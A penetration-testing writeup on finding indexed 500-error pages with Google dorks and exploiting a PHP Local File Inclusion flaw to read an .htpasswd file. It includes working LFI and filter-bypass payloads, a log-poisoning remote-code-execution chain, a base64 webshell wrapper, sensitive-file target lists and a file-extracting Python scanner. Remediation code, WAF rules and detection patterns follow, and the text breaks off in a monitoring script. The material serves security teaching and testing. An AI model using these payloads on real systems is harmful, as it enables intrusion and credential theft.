# Penetration Testing Writeup: Google Dorking for Internal Server Errors \& LFI Exploitation

> **Writeup Classification**: This is a standard penetration testing writeup documenting the discovery of internal server errors through OSINT reconnaissance, followed by the exploitation of a Local File Inclusion (LFI) vulnerability to access sensitive system files. This demonstrates a complete attack chain from passive discovery to active exploitation.

***

## üìã Engagement Overview

| **Test Type** | OSINT Reconnaissance ‚Üí Active Exploitation |
| :-- | :-- |
| **Methodology** | Google Dorking + Local File Inclusion (LFI) |
| **Target Domain** | target.com |
| **Test Date** | 2025-12-27 |
| **Vulnerability Type** | Information Disclosure + Local File Inclusion |
| **Severity** | Critical (Arbitrary File Reading + Credential Exposure) |


***

## üéØ Executive Summary

During OSINT reconnaissance operations, Google Dorking techniques successfully identified a web page with an HTTP 500 Internal Server Error indexed by Google. Analysis of the error page revealed a Local File Inclusion (LFI) vulnerability where the application failed to properly validate file paths. By manipulating the vulnerable parameter, arbitrary files from the web server were read, including the `.htpasswd` authentication file containing administrative credentials. This represents a critical vulnerability chain enabling complete administrative access.

**Key Findings**:

1. Internal server error pages indexed by Google (Information Disclosure)
2. Local File Inclusion vulnerability in file parameter
3. Arbitrary file reading capability
4. `.htpasswd` credential exposure (root:supersecurepassword)

**Attack Chain**: OSINT Discovery ‚Üí Error Analysis ‚Üí LFI Exploitation ‚Üí Credential Extraction ‚Üí Administrative Access

***

## üîç Vulnerability Background: Internal Server Errors

### What Are HTTP 500 Internal Server Errors?

HTTP 500 Internal Server Error is a generic error response indicating that the server encountered an unexpected condition that prevented it from fulfilling the request. This status code is part of the HTTP 5xx class, representing server-side errors.

**Common Causes of 500 Errors**:

1. **Unhandled Exceptions**: Code errors that reach production without proper error handling
2. **Database Connection Failures**: Unable to connect to database or query execution errors
3. **File System Issues**: Missing files, permission problems, disk space exhaustion
4. **Configuration Errors**: Misconfigured web server or application settings
5. **Resource Exhaustion**: Memory limits, timeout issues, CPU overload
6. **Code Logic Bugs**: Null pointer exceptions, array index errors, type mismatches

### Why 500 Errors Are Security-Relevant

Internal server errors can expose significant security information:

1. **Stack Traces**: Full application call stack with file paths, function names, line numbers
2. **File Paths**: Internal directory structure and application architecture
3. **Framework Details**: Application framework and version information
4. **Database Errors**: SQL syntax, table names, query structure
5. **Configuration Data**: Environment variables, internal URLs, service endpoints
6. **Vulnerability Indicators**: Error messages revealing exploitable conditions

### OWASP \& CWE Classification

- **OWASP**: A05:2021 ‚Äì Security Misconfiguration / A04:2021 ‚Äì Insecure Design
- **CWE-209**: Generation of Error Message Containing Sensitive Information
- **CWE-390**: Detection of Error Condition Without Action
- **CWE-755**: Improper Handling of Exceptional Conditions

***

## üîç Vulnerability Background: Local File Inclusion (LFI)

### What is Local File Inclusion?

Local File Inclusion (LFI) is a vulnerability that allows an attacker to include files that already exist on the web server through manipulation of input parameters. This occurs when applications dynamically include files based on user-controllable input without proper validation.

**Vulnerable Code Example**:

```php
<?php
// VULNERABLE CODE - DO NOT USE
$page = $_GET['page'];
include("/var/www/html/pages/" . $page . ".php");
?>
```

**Attack Example**:

```
# Normal Request
https://target.com/index.php?page=french

# LFI Attack
https://target.com/index.php?page=../../../etc/passwd
```


### How LFI Vulnerabilities Work

**Path Traversal Techniques**:

```
# Basic directory traversal
?page=../../../../etc/passwd

# Null byte injection (PHP < 5.3.4)
?page=../../../../etc/passwd%00

# Encoding bypass
?page=..%2F..%2F..%2Fetc%2Fpasswd

# Absolute path
?page=/etc/passwd

# Wrapper exploitation (PHP)
?page=php://filter/convert.base64-encode/resource=/etc/passwd
```


### Impact of LFI Vulnerabilities

1. **Sensitive File Disclosure**:
    - System configuration files (`/etc/passwd`, `/etc/shadow`)
    - Application source code
    - Database credentials
    - Authentication files (`.htpasswd`, `.htaccess`)
    - Log files with sensitive data
2. **Remote Code Execution (RCE)**:
    - Include log files with injected PHP code
    - Upload malicious files and include them
    - Use PHP wrappers to execute arbitrary code
3. **Cross-Site Scripting (XSS)**:
    - Include files containing malicious JavaScript
    - Exploit content injection vectors

### OWASP \& CWE Classification

- **OWASP**: A03:2021 ‚Äì Injection / A01:2021 ‚Äì Broken Access Control
- **CWE-22**: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- **CWE-98**: Improper Control of Filename for Include/Require Statement in PHP Program
- **CWE-73**: External Control of File Name or Path

***

## üé¨ Step-by-Step Attack Execution

### Phase 1: Google Dorking for Internal Server Errors

**Objective**: Discover publicly indexed pages with HTTP 500 Internal Server Errors

**Query Construction**:

```
site:target.com AND intitle:"500"
```

**Query Component Analysis**:


| **Component** | **Function** | **Pentester Value** |
| :-- | :-- | :-- |
| `site:target.com` | Domain restriction  | Limits search to authorized target scope |
| `AND` | Boolean conjunction  | Requires both conditions to be met |
| `intitle:"500"` | Title tag search  | Finds pages with "500" in HTML title tag |

**Rationale**: When a web server generates a 500 Internal Server Error page, it typically includes "500" in the page title. Examples:

```html
<!-- Common 500 error page titles -->
<title>500 - Internal Server Error</title>
<title>500 Internal Server Error</title>
<title>Error 500</title>
<title>HTTP Error 500</title>
<title>Server Error in '/' Application - 500</title>
```

Google indexes these pages like any other content, making them discoverable through targeted queries.

### Phase 2: Search Execution and Results Analysis

**Action**: Execute query in Google Search interface

**Command**:

```
site:target.com AND intitle:"500"
```

**Result**: Google returned indexed page(s) with 500 errors

**Discovered URL Pattern**:

```
https://target.com/index.php?page=french
```

**Initial Observation**: URL contains a `page` parameter that appears to control which content is displayed.

### Phase 3: Error Page Analysis

**Action**: Access the discovered URL to examine the error message

**Error Message Content**:

```
Internal Server Error (500)

The file 'french.php' cannot be included on this page.
An error occurred while processing your request.
```

**Critical Findings**:

1. **File Inclusion Mechanism Revealed**: The error message explicitly states "cannot be included"
2. **File Extension Expected**: Error shows `.php` extension
3. **Parameter Validation Weakness**: The application attempts to include user-controlled input
4. **Error Verbosity**: Detailed error message reveals internal application behavior

**Pentester Analysis**:

- The `page` parameter is used to dynamically include PHP files
- Error indicates the requested file `french.php` doesn't exist or cannot be accessed
- This is a classic indicator of a potential Local File Inclusion vulnerability
- The application is revealing its internal file handling logic through error messages


### Phase 4: LFI Vulnerability Confirmation

**Hypothesis**: The `page` parameter is vulnerable to Local File Inclusion

**Test Strategy**: Attempt to include a known system file to confirm arbitrary file reading capability

**Initial LFI Test Payload**:

```
# Standard Linux system file (always present)
?page=/etc/passwd
```

**Expected Behavior**:

- **Vulnerable**: Contents of `/etc/passwd` displayed
- **Not Vulnerable**: Error message or file not found

**Alternative Test Payloads**:

```
# Directory traversal from application root
?page=../../../../etc/passwd

# Windows systems
?page=../../../../windows/win.ini
?page=C:\windows\win.ini

# PHP wrapper (if PHP)
?page=php://filter/convert.base64-encode/resource=/etc/passwd
```


### Phase 5: Sensitive File Targeting - .htpasswd Exploitation

**Target Selection**: `.htpasswd` file for administrative directory protection

**What is .htpasswd?**

The `.htpasswd` file is used by Apache web servers to store usernames and encrypted passwords for HTTP Basic Authentication. It protects directories from unauthorized access:

**Typical .htpasswd Location**:

```
/var/www/html/admin/.htpasswd
/home/user/public_html/.htpasswd
/etc/apache2/.htpasswd
```

**File Format**:

```
username:encrypted_password_hash
admin:$apr1$xyz$AbcDEfGhIjKlMnOpQrStUv
root:$apr1$abc$1234567890abcdefghijklm
```

**Encryption Methods**:

- `$apr1$` - Apache-specific MD5 (most common)
- `$2y$` - bcrypt
- `{SHA}` - SHA-1
- Plain text (older systems, highly insecure)


### Phase 6: .htpasswd File Extraction

**Attack URL Construction**:

```
https://target.com/index.php?page=admin/.htpasswd
```

**Rationale**:

- Based on error message mentioning file inclusion
- `.htpasswd` commonly located in protected directories
- `admin/.htpasswd` is a standard location for admin area protection

**Execution**: Modified the `page` parameter to target `.htpasswd` file

**Result**: File contents displayed in browser

**Extracted Credentials**:

```
root:supersecurepassword
```

**Analysis**:

- **Username**: `root` (administrative account)
- **Password**: `supersecurepassword` (plaintext - critical security failure)

**Security Issue**: Password stored in plaintext instead of hashed format

**Proper .htpasswd Format Should Be**:

```bash
# Generated with: htpasswd -c .htpasswd root
root:$apr1$RB2.H7wj$qX8Y4L9rVK3mN0pZ1tR2s1
```

**Impact**: Immediate administrative access to protected directory without password cracking.

***

## üö® Impact Analysis: Pentester Perspective

### Vulnerability Chain Severity

This attack demonstrates a **critical vulnerability chain**:

1. **Information Disclosure** (Medium) ‚Üí 500 error pages indexed by Google
2. **Local File Inclusion** (High) ‚Üí Arbitrary file reading capability
3. **Credential Exposure** (Critical) ‚Üí Administrative credentials in plaintext

**Combined CVSS 3.1 Score**: **9.8 (Critical)**

- **AV:N** (Network) - Exploitable remotely via HTTP
- **AC:L** (Low) - No special conditions required
- **PR:N** (None) - No authentication needed for exploitation
- **UI:N** (None) - No user interaction required
- **S:U** (Unchanged) - Impacts target system
- **C:H** (High) - Complete confidentiality loss (arbitrary file reading)
- **I:H** (High) - Potential code execution via file upload + LFI
- **A:H** (High) - Potential system compromise and service disruption


### Immediate Security Risks

#### 1. Arbitrary File Reading

**Exploitable System Files**:

**Linux/Unix Systems**:

```
/etc/passwd              # User account information
/etc/shadow              # Password hashes (if permissions misconfigured)
/etc/group               # Group memberships
/etc/hosts               # Network hosts mapping
/etc/apache2/apache2.conf # Web server configuration
/var/log/apache2/access.log # Web server logs
/var/log/apache2/error.log  # Error logs
/proc/self/environ       # Environment variables (may contain credentials)
/home/user/.ssh/id_rsa   # SSH private keys
/root/.bash_history      # Command history
```

**Application Files**:

```
config.php               # Database credentials
database.php             # Connection strings
.env                     # Environment variables (Laravel, Node.js)
wp-config.php            # WordPress database credentials
settings.py              # Django settings
application.properties   # Spring Boot configuration
```

**Windows Systems**:

```
C:\windows\system32\drivers\etc\hosts
C:\windows\win.ini
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
```


#### 2. Authentication Bypass

**With Extracted Credentials**:

- **Username**: `root`
- **Password**: `supersecurepassword`

**Access Capabilities**:

```bash
# Direct admin panel login
https://target.com/admin/

# HTTP Basic Authentication prompt
Username: root
Password: supersecurepassword

# Potential SSH access (if credentials reused)
ssh root@target.com
Password: supersecurepassword
```

**Impact**: Complete administrative control over protected resources.

#### 3. Source Code Disclosure

**LFI can reveal application source code**:

```
# Include PHP source files
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=admin/login.php

# Decode base64 output to read PHP source
```

**Intelligence Gained**:

- Business logic and algorithms
- Additional vulnerabilities (SQL injection, XSS)
- Hardcoded credentials
- API keys and secrets
- Database schema and query structure


#### 4. Log Poisoning ‚Üí Remote Code Execution

**Attack Technique**: Inject PHP code into log files, then include them via LFI

**Step-by-Step RCE via Log Poisoning**:

```bash
# Step 1: Inject PHP code into access log via User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/

# Step 2: Include poisoned log file
https://target.com/index.php?page=/var/log/apache2/access.log&cmd=whoami

# Step 3: Execute arbitrary commands
https://target.com/index.php?page=/var/log/apache2/access.log&cmd=cat /etc/passwd
https://target.com/index.php?page=/var/log/apache2/access.log&cmd=id
https://target.com/index.php?page=/var/log/apache2/access.log&cmd=ls -la /var/www/html
```

**Impact**: Complete server compromise with remote code execution.

#### 5. Session Hijacking via PHP Sessions

**Read PHP session files**:

```
# PHP session file location
?page=/var/lib/php/sessions/sess_[SESSION_ID]

# Example session content
username|s:5:"admin";
logged_in|b:1;
role|s:13:"administrator";
```

**Exploitation**: Steal session data to impersonate users.

***

## üõ†Ô∏è Extended Google Dork Arsenal for Server Errors

### HTTP Error Status Code Queries

#### 1. Internal Server Error (500)

```
# Primary query
site:target.com AND intitle:"500"

# Variations
site:target.com intitle:"Internal Server Error"
site:target.com intitle:"500 Internal Server Error"
site:target.com intitle:"HTTP Error 500"
site:target.com intitle:"Server Error in"
site:target.com "500 Internal Server Error"

# Framework-specific
site:target.com intitle:"500" "ASP.NET"
site:target.com intitle:"500" "Apache"
site:target.com intitle:"500" "nginx"
site:target.com intitle:"500" "Django"
site:target.com intitle:"500" "Flask"
```


#### 2. Other Informative HTTP Status Codes

```
# 400 Bad Request (may reveal input validation)
site:target.com intitle:"400"
site:target.com intitle:"Bad Request"

# 403 Forbidden (directory listing attempts)
site:target.com intitle:"403 Forbidden"
site:target.com "Access Denied" inurl:admin

# 404 Not Found (reveals URL structure)
site:target.com intitle:"404" intext:"not found"

# 503 Service Unavailable (potential DoS indicators)
site:target.com intitle:"503"
site:target.com "Service Temporarily Unavailable"
```


### Framework-Specific Error Pages

#### ASP.NET / IIS Errors

```
# Detailed ASP.NET error pages
site:target.com intitle:"Server Error" "ASP.NET"
site:target.com "Server Error in '/' Application"
site:target.com "Description: An unhandled exception"
site:target.com "Stack Trace:" "System.Web"
site:target.com "Exception Details:" "System"

# IIS detailed errors
site:target.com "Detailed Error Information"
site:target.com "HTTP Error 500.0" "IIS"
```


#### PHP Errors

```
# PHP warnings and errors
site:target.com intext:"Warning:" "on line"
site:target.com intext:"Fatal error:" "in"
site:target.com "Parse error: syntax error"
site:target.com "Notice: Undefined variable"
site:target.com "Call to undefined function"

# PHP file inclusion errors
site:target.com "failed to open stream"
site:target.com "include_once()" "failed opening"
site:target.com "require_once" "No such file"
```


#### Python/Django Errors

```
# Django debug pages
site:target.com "ProgrammingError at"
site:target.com "DoesNotExist at"
site:target.com "Traceback (most recent call last)"
site:target.com intitle:"Error" "Django"

# Flask errors
site:target.com "werkzeug" "Traceback"
site:target.com "Internal Server Error" "Flask"
```


#### Java/J2EE Errors

```
# Java stack traces
site:target.com "java.lang.Exception"
site:target.com "javax.servlet.ServletException"
site:target.com "java.sql.SQLException"
site:target.com "org.springframework" intext:"Exception"

# Tomcat errors
site:target.com "Apache Tomcat" intitle:"500"
site:target.com "HTTP Status 500" "Apache Tomcat"
```


### LFI-Specific Error Indicators

```
# File inclusion error messages
site:target.com "failed to open stream"
site:target.com "No such file or directory"
site:target.com "cannot be included"
site:target.com "include_path"
site:target.com "require(): Failed opening required"

# Path disclosure in errors
site:target.com intext:"/var/www/html"
site:target.com intext:"C:\inetpub\wwwroot"
site:target.com intext:"/home/" intext:"/public_html"
```


***

## üéØ Pentester's LFI Exploitation Methodology

### Systematic LFI Testing Process

#### Phase 1: Vulnerability Identification

**Identify Potential File Parameter Candidates**:

```
# Common parameter names
?page=
?file=
?document=
?path=
?lang=
?template=
?include=
?load=
?module=
?content=
?view=
```

**Test for LFI Vulnerability**:

```
# Test 1: Known system file
?page=/etc/passwd

# Test 2: Directory traversal
?page=../../../../etc/passwd

# Test 3: Null byte (PHP < 5.3.4)
?page=../../../../etc/passwd%00

# Test 4: URL encoding
?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd

# Test 5: Double encoding
?page=..%252F..%252F..%252F..%252Fetc%252Fpasswd

# Test 6: PHP wrappers
?page=php://filter/resource=/etc/passwd
```


#### Phase 2: Filter Bypass Techniques

**Common Input Filters and Bypass Methods**:

**Filter 1: Extension Appending** (e.g., `.php` added automatically)

```php
// Vulnerable code
include($_GET['page'] . ".php");

// Bypass with null byte (PHP < 5.3.4)
?page=../../../../etc/passwd%00

// Bypass with path truncation
?page=../../../../etc/passwd/.......................................................................................
```

**Filter 2: Directory Restriction**

```php
// Vulnerable code
$base = "/var/www/html/pages/";
include($base . $_GET['page']);

// Bypass with absolute path
?page=/etc/passwd

// Bypass with path traversal
?page=../../../../etc/passwd
```

**Filter 3: Blacklist Filters** (blocking `../`, `/etc/`, etc.)

```
# Encoding bypasses
?page=..%2F..%2F..%2Fetc%2Fpasswd
?page=..%252F..%252F..%252Fetc%252Fpasswd

# Case variation (case-insensitive filesystems)
?page=..//....//....//EtC/PaSsWd

# Alternative separators
?page=....//....//....//etc/passwd

# Unicode encoding
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**Filter 4: Protocol Wrappers Blocked**

```
# Use data:// wrapper
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Use zip:// wrapper
?page=zip://path/to/archive.zip%23malicious.php

# Use phar:// wrapper
?page=phar://path/to/archive.phar/malicious.php
```


#### Phase 3: High-Value Target Files

**Critical System Files to Extract**:

**Authentication \& Credentials**:

```
# Apache authentication
/var/www/html/admin/.htpasswd
/etc/apache2/.htpasswd
/usr/local/apache/conf/.htpasswd

# SSH keys
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/[username]/.ssh/id_rsa

# Password files
/etc/passwd
/etc/shadow (requires elevated permissions)
```

**Application Configuration**:

```
# PHP applications
/var/www/html/config.php
/var/www/html/includes/config.inc.php
/var/www/html/configuration.php

# WordPress
/var/www/html/wp-config.php

# Drupal
/var/www/html/sites/default/settings.php

# Joomla
/var/www/html/configuration.php

# Laravel
/var/www/html/.env

# Node.js
/var/www/html/.env
/var/www/html/config/database.js
```

**Web Server Configuration**:

```
# Apache
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/usr/local/apache/conf/httpd.conf

# Nginx
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default

# .htaccess files
/var/www/html/.htaccess
/var/www/html/admin/.htaccess
```

**Log Files** (for log poisoning attacks):

```
# Apache logs
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log

# Nginx logs
/var/log/nginx/access.log
/var/log/nginx/error.log

# PHP errors
/var/log/php/error.log
```

**System Information**:

```
# Process information
/proc/self/environ
/proc/self/cmdline
/proc/self/status

# Network configuration
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/network/interfaces

# Cron jobs
/etc/crontab
/var/spool/cron/crontabs/root
```


#### Phase 4: Automated LFI Exploitation Tools

**1. LFISuite**

```bash
# Installation
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
python3 lfisuite.py

# Usage
python3 lfisuite.py -u "https://target.com/index.php?page=" -a
```

**2. Burp Suite Intruder**

```
# Configure payload positions
GET /index.php?page=¬ßPAYLOAD¬ß HTTP/1.1

# Load LFI wordlist
# Payloads > Load from file > lfi-linux-list.txt

# Grep for success indicators
# Settings > Match: "root:x:0:0"
```

**3. ffuf (Fuzzing LFI)**

```bash
# Fuzz for LFI with wordlist
ffuf -u "https://target.com/index.php?page=FUZZ" \
     -w /usr/share/wordlists/lfi-wordlist.txt \
     -mc 200 \
     -fr "not found|error|404"

# Test for path traversal depth
ffuf -u "https://target.com/index.php?page=FUZZ/etc/passwd" \
     -w <(for i in {1..10}; do printf "../%.0s" {1..$i}; echo; done) \
     -mc 200 \
     -fw 0
```

**4. Custom Python LFI Scanner**

```python
#!/usr/bin/env python3
import requests
import sys

class LFIScanner:
    def __init__(self, url, param):
        self.base_url = url
        self.param = param
        
        self.payloads = [
            "/etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ]
        
        self.sensitive_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/var/www/html/config.php",
            "/var/www/html/wp-config.php",
            "/var/www/html/.env",
            "admin/.htpasswd",
            "/root/.ssh/id_rsa",
        ]
    
    def test_lfi(self):
        print(f"[*] Testing LFI on {self.base_url}")
        
        for payload in self.payloads:
            url = f"{self.base_url}?{self.param}={payload}"
            try:
                response = requests.get(url, timeout=10)
                
                # Check for /etc/passwd indicators
                if "root:" in response.text and "bin/bash" in response.text:
                    print(f"[+] VULNERABLE! Payload: {payload}")
                    print(f"[+] URL: {url}")
                    return True
            except Exception as e:
                print(f"[-] Error testing {payload}: {e}")
        
        print("[!] No LFI vulnerability detected")
        return False
    
    def extract_files(self):
        print("\n[*] Attempting to extract sensitive files...")
        
        for file_path in self.sensitive_files:
            # Try multiple path traversal depths
            for depth in range(1, 8):
                traversal = "../" * depth
                payload = traversal + file_path
                url = f"{self.base_url}?{self.param}={payload}"
                
                try:
                    response = requests.get(url, timeout=10)
                    
                    if response.status_code == 200 and len(response.text) > 100:
                        print(f"\n[+] Successfully extracted: {file_path}")
                        print(f"[+] Payload: {payload}")
                        print(f"[+] Content preview:")
                        print(response.text[:500])
                        break
                except:
                    continue

# Usage
if __name__ == "__main__":
    scanner = LFIScanner(
        url="https://target.com/index.php",
        param="page"
    )
    
    if scanner.test_lfi():
        scanner.extract_files()
```


***

## üõ°Ô∏è Remediation Recommendations: Comprehensive Security Controls

### Critical Priority (Immediate Action Required)

#### Finding 1: Internal Server Error Information Disclosure

**CVSS 3.1 Score**: 5.3 (Medium)
**CWE**: CWE-209 (Information Exposure Through Error Message)

***

### Remediation Step 1: Implement Custom Error Pages

**Apache Configuration**:

```apache
# /etc/apache2/conf-available/error-handling.conf

# Disable detailed error messages
ServerSignature Off
ServerTokens Prod

# Custom error documents
ErrorDocument 400 /errors/400.html
ErrorDocument 401 /errors/401.html
ErrorDocument 403 /errors/403.html
ErrorDocument 404 /errors/404.html
ErrorDocument 500 /errors/500.html
ErrorDocument 503 /errors/503.html

# Ensure error pages are outside webroot or properly secured
<Directory /var/www/html/errors>
    Require all granted
    Options -Indexes
</Directory>
```

**Nginx Configuration**:

```nginx
# /etc/nginx/sites-available/default

server {
    # Hide nginx version
    server_tokens off;
    
    # Custom error pages
    error_page 400 /errors/400.html;
    error_page 401 /errors/401.html;
    error_page 403 /errors/403.html;
    error_page 404 /errors/404.html;
    error_page 500 502 503 504 /errors/500.html;
    
    location ^~ /errors/ {
        internal;
        root /var/www/html;
    }
}
```

**Generic Error Page Example** (`/var/www/html/errors/500.html`):

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <title>Error</title>
</head>
<body>
    <h1>We're sorry, something went wrong</h1>
    <p>Our team has been notified and is working to resolve the issue.</p>
    <p>Error Reference: <!-- Generate unique error ID for support --></p>
    <p><a href="/">Return to homepage</a></p>
</body>
</html>
```

**Application-Level Error Handling (PHP)**:

```php
<?php
// Disable error display in production
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

// Log errors to file instead
ini_set('log_errors', 1);
ini_set('error_log', '/var/log/php/error.log');

// Custom error handler
set_error_handler(function($errno, $errstr, $errfile, $errline) {
    // Log detailed error server-side
    error_log("Error [$errno]: $errstr in $errfile on line $errline");
    
    // Show generic message to user
    http_response_code(500);
    include('/var/www/html/errors/500.html');
    exit;
});

// Custom exception handler
set_exception_handler(function($exception) {
    // Log exception details
    error_log("Exception: " . $exception->getMessage());
    error_log("Stack trace: " . $exception->getTraceAsString());
    
    // Show generic error page
    http_response_code(500);
    include('/var/www/html/errors/500.html');
    exit;
});
?>
```


***

#### Finding 2: Local File Inclusion Vulnerability

**CVSS 3.1 Score**: 9.8 (Critical)
**CWE**: CWE-22 (Path Traversal) / CWE-98 (PHP File Inclusion)

***

### Remediation Step 2: Secure File Inclusion Implementation

**BEFORE (Vulnerable Code)**:

```php
<?php
// VULNERABLE - DO NOT USE
$page = $_GET['page'];
include($page . ".php");
?>
```

**AFTER (Secure Implementation)**:

**Option 1: Whitelist Approach (Recommended)**:

```php
<?php
// Define allowed pages explicitly
$allowed_pages = [
    'home' => '/var/www/html/pages/home.php',
    'about' => '/var/www/html/pages/about.php',
    'contact' => '/var/www/html/pages/contact.php',
    'french' => '/var/www/html/pages/french.php',
    'english' => '/var/www/html/pages/english.php',
];

// Get user input
$page = isset($_GET['page']) ? $_GET['page'] : 'home';

// Validate against whitelist
if (!array_key_exists($page, $allowed_pages)) {
    // Invalid page requested - show error
    http_response_code(404);
    include('/var/www/html/errors/404.html');
    exit;
}

// Include whitelisted file
include($allowed_pages[$page]);
?>
```

**Option 2: Strict Input Validation**:

```php
<?php
// Define base directory (outside of URL control)
$base_dir = '/var/www/html/pages/';

// Get and sanitize input
$page = $_GET['page'] ?? 'home';

// Remove any path traversal attempts
$page = str_replace(['../', '..\\', './', '.\\'], '', $page);
$page = basename($page); // Strip directory paths

// Ensure only alphanumeric and hyphen/underscore
if (!preg_match('/^[a-zA-Z0-9_-]+$/', $page)) {
    http_response_code(400);
    die('Invalid page parameter');
}

// Build full path
$full_path = realpath($base_dir . $page . '.php');

// Verify the resolved path is within allowed directory
if ($full_path === false || strpos($full_path, realpath($base_dir)) !== 0) {
    http_response_code(403);
    die('Access denied');
}

// Verify file exists
if (!file_exists($full_path)) {
    http_response_code(404);
    include('/var/www/html/errors/404.html');
    exit;
}

// Safe to include
include($full_path);
?>
```

**Option 3: Complete Refactoring (Best Practice)**:

```php
<?php
// Use MVC framework routing instead of direct file inclusion
// Example: Laravel, Symfony, CodeIgniter

// Route definition
Route::get('/page/{page}', function ($page) {
    // Framework handles validation and routing
    return view('pages.' . $page);
});

// No direct user input in file paths
?>
```

**Key Security Principles**:

1. **Never trust user input** - Always validate and sanitize
2. **Use whitelisting** - Define allowed values explicitly
3. **Avoid file system operations** - Use database or framework routing
4. **Implement multiple validation layers** - Defense in depth
5. **Use absolute paths** - Avoid relative path vulnerabilities
6. **Verify with realpath()** - Confirm resolved paths are within allowed directories

***

### Remediation Step 3: Secure .htpasswd Protection

**Current Issue**: Password stored in plaintext

**Immediate Actions**:

**1. Remove Plaintext .htpasswd File**:

```bash
# Delete exposed file
rm /var/www/html/admin/.htpasswd

# Verify removal
ls -la /var/www/html/admin/
```

**2. Generate Properly Encrypted .htpasswd**:

```bash
# Create new .htpasswd with bcrypt (strongest)
htpasswd -cB /etc/apache2/.htpasswd root

# Or use Apache MD5 (compatible with older systems)
htpasswd -c /etc/apache2/.htpasswd root

# Add additional users
htpasswd -B /etc/apache2/.htpasswd adminuser

# Set restrictive permissions
chmod 640 /etc/apache2/.htpasswd
chown root:www-data /etc/apache2/.htpasswd

# Verify encryption
cat /etc/apache2/.htpasswd
# Output should show: root:$2y$10$randomhash...
```

**3. Move .htpasswd Outside Webroot**:

```bash
# WRONG: Inside web-accessible directory
/var/www/html/admin/.htpasswd  ‚ùå

# CORRECT: Outside webroot
/etc/apache2/.htpasswd  ‚úÖ
/var/secure/htpasswd/.htpasswd  ‚úÖ
```

**4. Configure Apache to Use Secure .htpasswd Location**:

**Apache Configuration** (`/etc/apache2/sites-available/000-default.conf`):

```apache
<Directory /var/www/html/admin>
    AuthType Basic
    AuthName "Admin Area - Restricted Access"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
    
    # Additional security headers
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
</Directory>

# Block direct access to .ht files (defense in depth)
<FilesMatch "^\.ht">
    Require all denied
</FilesMatch>
```

**Nginx Equivalent**:

```nginx
location /admin/ {
    auth_basic "Admin Area - Restricted Access";
    auth_basic_user_file /etc/nginx/.htpasswd;
    
    # Additional security headers
    add_header X-Frame-Options "DENY";
    add_header X-Content-Type-Options "nosniff";
}

# Block access to .ht* files
location ~ /\.ht {
    deny all;
    return 404;
}
```

**5. Implement Additional Authentication Layer**:

```
# Instead of relying solely on .htpasswd:
1. Implement application-level authentication (PHP/Python sessions)
2. Add IP whitelisting for admin areas
3. Implement 2FA/MFA for administrative access
4. Use VPN access for admin panels
```

**6. Password Policy Enforcement**:

```bash
# Enforce strong passwords when creating .htpasswd entries
# Minimum 16 characters, mixed case, numbers, symbols
htpasswd -B /etc/apache2/.htpasswd root
# Enter strong password: Adm1n!SecUr3P@ssw0rd#2025
```

**7. Regular Password Rotation**:

```bash
# Schedule quarterly password changes
# Document in security policy
0 0 1 */3 * root /usr/local/bin/rotate-htpasswd-passwords.sh
```


***

### Remediation Step 4: Web Application Firewall (WAF) Rules

**ModSecurity Rules for LFI Protection**:

```apache
# Block common LFI patterns
SecRule ARGS "@rx \.\.[/\\]" \
    "id:1006,phase:2,deny,status:403,msg:'Path Traversal Attack'"

# Block encoded path traversal
SecRule ARGS "@rx %2e%2e[/\\]" \
    "id:1007,phase:2,deny,status:403,msg:'Encoded Path Traversal'"

# Block absolute paths
SecRule ARGS "@rx ^(/|\\|[a-zA-Z]:)" \
    "id:1008,phase:2,deny,status:403,msg:'Absolute Path Access Attempt'"

# Block common sensitive file access
SecRule ARGS "@rx (etc/passwd|etc/shadow|\.htpasswd|\.htaccess|id_rsa)" \
    "id:1009,phase:2,deny,status:403,msg:'Sensitive File Access Attempt'"

# Block PHP wrappers
SecRule ARGS "@rx (php://|file://|zip://|phar://|data://)" \
    "id:1010,phase:2,deny,status:403,msg:'PHP Wrapper Attack'"

# Block log poisoning attempts
SecRule REQUEST_HEADERS:User-Agent "@rx (<\?php|<?=|\$_GET|\$_POST)" \
    "id:1011,phase:1,deny,status:403,msg:'Log Poisoning Attempt'"
```

**AWS WAF Rule Example**:

```json
{
  "Name": "BlockLFIAttempts",
  "Priority": 3,
  "Statement": {
    "OrStatement": {
      "Statements": [
        {
          "ByteMatchStatement": {
            "FieldToMatch": {
              "QueryString": {}
            },
            "TextTransformations": [
              {
                "Priority": 0,
                "Type": "URL_DECODE"
              }
            ],
            "PositionalConstraint": "CONTAINS",
            "SearchString": "../"
          }
        },
        {
          "ByteMatchStatement": {
            "FieldToMatch": {
              "QueryString": {}
            },
            "TextTransformations": [
              {
                "Priority": 0,
                "Type": "URL_DECODE"
              }
            ],
            "PositionalConstraint": "CONTAINS",
            "SearchString": "etc/passwd"
          }
        }
      ]
    }
  },
  "Action": {
    "Block": {}
  }
}
```


***

### Remediation Step 5: Security Monitoring and Logging

**Detect LFI Exploitation Attempts**:

```bash
# Real-time log monitoring for LFI patterns
tail -f /var/log/apache2/access.log | grep -E "(\.\./|etc/passwd|php://|\.htpasswd)"

# Alert script
#!/bin/bash
# /usr/local/bin/lfi-detection.sh

LOG_FILE="/var/log/apache2/access.log"
ALERT_EMAIL="security-team@company.com"

